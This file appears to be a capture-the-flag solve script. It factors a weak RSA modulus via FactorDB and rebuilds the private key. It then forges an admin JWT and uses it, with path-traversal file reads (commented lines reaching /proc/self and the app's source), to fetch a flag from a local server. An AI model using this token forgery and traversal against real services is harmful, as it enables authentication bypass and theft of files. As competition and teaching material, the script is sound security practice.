import jwt
import requests
import re
from factordb.factordb import FactorDB
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse
# you can derive this using a tool like: https://github.com/FlorianPicca/JWT-Key-Recovery/blob/main/recover.py
# Must use e = 1337 -> bruteforceable
number = int("0xb0f5274da74063775e002f8e5fe403db4ad63707294447af930056bcacc48603efc86798d40d348b21751a0c10ff4bd70552c8327c90b1e54e90863988d1a0c1d6ad582113bcc7e55c2a9d5e8c791bc4c2767ed987e8757ea8a9368f2b3b9a8ff922403b738df3606affc94d7b5c8f7b64801242ba7fd8bae90e3a16d0db568b640e0132db94c9767ca9bfa1f2074cea1216c288285642ef1bb1dedbc7a71db0ce7088ed019dfc0a46f945fcfb71459af7a49aaa7982f3cbbe972a43dc0786d170ca9fd0bd24f15d59933887333bff30be2403d25a0e52e10e8c36b0a8a3b3371caee7a9f8ab12f230704218eb5e5606d25899dfafb1ff2764831588bd3296af", 16)

fdb = FactorDB(number)
fdb.connect()
factors = fdb.get_factor_list()

if len(factors) != 2:
    raise ValueError("The number does not have exactly two prime factors.")

p, q = factors

n = p * q
e = 1337
d = inverse(e, (p - 1) * (q - 1))

private_key = RSA.construct((n, e, d, p, q))
private_key_pem = private_key.export_key().decode()

data = {
    "username": "4dm1n",
    "iat": 1735289510
}

token = jwt.encode(data, private_key_pem, algorithm="RS256")
BASE_URL = "http://127.0.0.1:1337"

def get_file(file, token):
    url = f"{BASE_URL}/1337_v4u17"
    headers = {
        "Cookie": f"token={token}"
    }
    response = requests.get(url, headers=headers, params={"file": file})
    
    return response.text

# print(get_file("../../../../../proc/self/cmdline", token))
# print(get_file("../../../../../proc/self/cwd/5up3r_53cur3_50urc3_c0d3.js", token))
    
response = get_file("./node_modules/secret-flag/index.js", token)

flag = re.search(r"uoftctf{.*}", response).group()
print(flag)
        